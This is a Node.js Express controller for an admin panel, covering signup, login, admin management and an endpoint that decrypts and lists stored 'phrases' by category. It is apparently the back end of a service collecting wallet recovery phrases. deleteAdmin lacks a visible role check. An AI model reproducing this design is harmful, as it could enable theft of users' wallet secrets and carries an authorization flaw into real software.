const { adminModel } = require("../models/adminModel")
const { errorHandler } = require("../utilis/handleError")
const { dataModel } = require("../models/dataModel")
const { decrypt } = require("../utilis/crypto")


const jwt = require("jsonwebtoken")
const bcrypt = require("bcryptjs")






const period = 60 * 60 * 24 * 7 
const generateToken = (admin) => {
    return jwt.sign({id: admin._id, role: admin.role}, process.env.JWT_SECRET_MESSAGE, {expiresIn: period})
}



const initialSignup = async(req, res) => {
    try {
        const {email, password} = req.body

        if(!email || !password) {
            return res.status(400).json({
                success: false,
                message: "All fields are required"
            })
        }
        const adminExist = await adminModel.findOne({email})
        if(adminExist) {
            return res.status(400).json({
                success: false,
                message: "Email already exists"
            })
        }

        const adminCount = await adminModel.countDocuments()
        if (adminCount > 0) {
            return res.status(403).json({
                success: false,
                message: "Signup disabled. Contact the super admin"
            })
        }

        const salt = await bcrypt.genSalt(10)
        const hashedPassword = await bcrypt.hash(password, salt)

        const newAdmin = new adminModel({
            email, password: hashedPassword, role: "super_admin"
        })

        const savedAdmin = await newAdmin.save()

        const token = generateToken(savedAdmin)

        res.cookie("signinToken", token, {
            httpOnly: true,
            secure: process.env.NODE_ENV === "production",
            sameSite: process.env.NODE_ENV === "production" ? "None" : "Lax",
            maxAge: 1000 * period
        })

        return res.status(201).json({
            success: true,
            message: "Super admin created successfully",
            admin: {
                id: savedAdmin._id,
                email: savedAdmin.email,
                role: savedAdmin.role,
            },
            token
        })
    } catch (err) {
        let error = errorHandler(err)
        res.status(400).json({
            success: false,
            error
        })
    }
}


const adminLogin = async (req, res) => {
    try {
        const {email, password} = req.body

        if(!email || !password){
            return res.status(404).json({
                success: false,
                message: "Email and password required"
            })
        }

        const admin = await adminModel.findOne({email})
        if(!admin) {
            return res.status(404).json({
                success: false,
                message: "No account found with this email"
            })
        }

        const match = await bcrypt.compare(password, admin.password)
        if(!match) {
            return res.status(401).json({
                success: false,
                message: "Incorrect Password"
            })
        }

        admin.lastLoginAt = new Date()
        admin.lastSeenAt = new Date()
        admin.isOnline = true
        await admin.save()

        const token = generateToken(admin)

        // res.cookie("signinToken", token, {
        //     httpOnly: true,
        //     // secure: process.env.NODE_ENV === "production",
        //     // sameSite: process.env.NODE_ENV === "production" ? "None" : "Lax",
        //     secure: true,
        //     sameSite: "none",
        //     maxAge: 7 * 24 * 60 * 60 * 1000
        // })

        res.status(200).json({
            success: true,
            message: "Admin logged in successfully",
            admin: {
                id: admin._id,
                email: admin.email,
                role: admin.role,
                lastLoginAt: admin.lastLoginAt,
                isOnline: admin.isOnline
            },
            token
        })
    } catch (err) {
        const error = errorHandler(err)
        res.status(400).json({
            success: false,
            error
        })
    }
}


const createNewAdmin = async (req, res) => {
    try {
        const {email, password} = req.body

        if(!req.admin || req.admin.role !== "super_admin"){
            return res.status(403).json({
                success: false,
                message: "Access denied. Only super admins can create new admin"
            })
        }

        if(!email || !password) {
            return res. status(400).json({
                success: false,
                message: "All fields are required"
            })
        }

        const existingAdmin = await adminModel.findOne({email})
        if (existingAdmin){
            return res.status(400).json({
                success: false,
                message: "Admin with this email already exist"
            })
        }
        
        
        const hashedPassword = await bcrypt.hash(password, 10)


        const newAdmin = new adminModel({
            email, password: hashedPassword, role: "admin", createdBy: req.admin.id
        })

        newAdmin.save()

        res.status(201).json({
            success: true,
            message: "Admin created successfully",
            admin: {
                id: newAdmin._id,
                email: newAdmin.email,
                role: newAdmin.role,
            }
        })
    } catch (err) {
        res.status(500).json({
            success: false,
            message: "Error creating admin",
            error: err.message
        })
    }
}



const getAllPhrases = async (req, res) => {
    try {
        const records = await dataModel.find().sort({ createdAt: -1})

        const decrypted = records.map((r) => ({
            id: r._id,
            category: r.category,
            phrases: decrypt(r.phrases),
            createdAt: r.createdAt
        }))

        res.json({
            success: true,
            data: decrypted
        })
    } catch (err) {
        res.status(500).json({
            success: false,
            message: "Failed to fetch phrases"
        })
    }
}




const logout = async (req, res) => {
    try {

        // if (!req.admin) {
        //     res.clearCookie("signinToken", {
        //       httpOnly: true,
        //     //   secure: process.env.NODE_ENV === "production",
        //     //   sameSite: process.env.NODE_ENV === "production" ? "None" : "Lax",
        //       secure: true,
        //       sameSite: "none",
        //     })
      
        //     return res.json({ success: true, message: "Logged out successfully" })
        // }


        if(req.admin) {
            await adminModel.findByIdAndUpdate(req.admin.id, {
                isOnline: false,
                lastSeenAt: new Date()
            })
        }

        // res.clearCookie("signinToken", {
        //     httpOnly: true,
        //     // secure: process.env.NODE_ENV === "production",
        //     // sameSite:  process.env.NODE_ENV === "production" ? "None" : "Lax",
        //     secure: true,
        //     sameSite: "none",
        // })

        res.json({success: true, message: "Logged out successfully"})
    } catch (err) {
        res.status(500).json({success: false, message: "Logout failed"})
    }
}


const deleteAdmin = async (req, res) => {
    try {
       const adminId = req.params.id
       
       const target = await adminModel.findById(adminId)
       if(!target) {
        return res.status(404).json({
            success: false,
            message: "Admin not available"
        })
       }

       if (target.role === "super_admin") {
        return res.status(403).json({
            success: false,
            message: "You cannot delete a super admin"
        })
       }

       await adminModel.findByIdAndDelete(adminId)

       res.json({
        success: true,
        message: "Admin deleted successfully"
       })
    } catch (err) {
       res.status(500).json({
        success: false,
        message: "Failed to delete admin",
        error: err.message
       }) 
    }
} 

module.exports = {initialSignup, adminLogin, createNewAdmin, getAllPhrases, logout, deleteAdmin}